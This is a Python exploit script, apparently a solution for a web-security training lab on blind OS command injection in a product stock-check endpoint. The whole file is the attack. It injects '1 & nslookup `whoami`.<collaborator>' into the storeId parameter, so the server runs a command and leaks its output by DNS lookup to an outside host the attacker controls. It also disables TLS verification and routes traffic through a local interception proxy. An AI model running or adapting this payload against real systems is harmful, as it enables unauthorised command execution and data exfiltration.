import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, collaborator_server):
    stock_path = '/product/stock'
    command_injection = f'1 & nslookup `whoami`.{collaborator_server}'
    params = {'productId': '1', 'storeId': command_injection}
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) Command injection attempted. Check Burp Collaborator for DNS interaction.")
    else:
        print("(-) Command injection failed.")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <burp_collaborator_server>" % sys.argv[0])
        print("(+) Example: %s www.example.com your-collaborator-id.burpcollaborator.net" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    collaborator_server = sys.argv[2]

    print("(+) Exploiting command injection with out-of-band interaction...")
    run_command(url, collaborator_server)

if __name__ == "__main__":
    main()

